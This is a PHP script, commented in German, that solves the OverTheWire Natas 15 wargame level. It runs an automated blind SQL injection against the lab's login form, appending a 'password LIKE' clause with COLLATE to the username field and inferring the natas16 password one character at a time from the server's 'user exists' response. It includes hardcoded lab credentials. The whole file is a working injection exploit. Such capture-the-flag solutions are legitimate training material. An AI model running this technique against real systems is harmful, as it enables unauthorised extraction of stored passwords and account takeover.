<?php

# Annahme: durch Testen von Username ist natas15 and password starts with 
# Buchstabe X wenn Korrekt nächsten Buchstaben mit allen möglichen Buchstaben und Zahlen Testen.
# Immer Wenn User doesnt exist kommt nächstes mögliche ASCII zeichen wählen.
#
# Wenn ein Zeichen zu user exist führt dann Buchstaben ergänzen bzw. % ein Feld weiter
# nach rechts schieben.
#
# Abbruch der Schleife wenn user doesnt exist bei allen möglichen Zeichen kommt. 
# → Wir haben das Password.
#
$pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$password = '';
$credentials ="natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"; 
$website = "http://natas15.natas.labs.overthewire.org";



$ch = curl_init();	
curl_setopt($ch,CURLOPT_URL,$website);
curl_setopt($ch,CURLOPT_HTTPAUTH, CURLAUTH_ANY);
curl_setopt($ch,CURLOPT_USERPWD, $credentials);
# Response statt output über curl_exec zurückgeben an $res zum analysieren
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
$res = curl_exec($ch);
$status_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$cnt = 0;
while(1){
	$cnt++;
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$match = false;
	for ($i=0; $i < strlen($pool); $i++){
		$new_str = sprintf("username=natas16\" and password COLLATE utf8mb4_bin LIKE \"%s%s%%", $password, $pool[$i]);
		#$new_str= "natas16\" and password LIKE" . " " .$password . $pool[$i]. "%\"";  
		echo "$new_str\n";
		curl_setopt($ch,CURLOPT_POSTFIELDS, $new_str );
		$res = curl_exec($ch);
		echo $res;

		if(stripos($res, "This user exists.")){
			$password .= $pool[$i];
			$match = true;
			break;
		}
		# Seite zurücksetzen auf default für folgeEingabe
		curl_setopt($ch,CURLOPT_URL,$website);
	}
	if($match == false){
		# Password is complete; no match possible anymore
		break;
	}
}
echo "password of nadat16 is $password it dauerte $cnt Versuche\n";
curl_close($ch);
?>



		

	


